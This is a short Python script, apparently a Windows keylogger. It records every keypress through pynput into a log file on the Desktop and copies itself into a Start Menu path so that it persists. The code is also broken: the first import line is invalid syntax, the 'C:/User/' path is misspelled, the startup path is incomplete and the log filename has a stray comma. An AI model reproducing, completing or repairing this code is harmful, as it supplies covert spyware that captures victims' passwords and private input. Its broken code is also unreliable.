import pynput.keyboard import listener
import os 
import logging
from shutil import copyfile


username = os.getlogin()
loggin_directory = f"C:/Users/{username}/Desktop"

copyfile('main.py',f'C:/User/{username}/AppData/Roaming/Start Menu/Start ')

logging.basicConfig(filename=f"{loggin_directory}/mylog.txt, ", level=logging.DEBUG,format="%(asctime)s: %(message)s")


def key_handler(key):
    logging.info(key)

with listener(on_press=key_handler) as listener:
    listener.join() 
    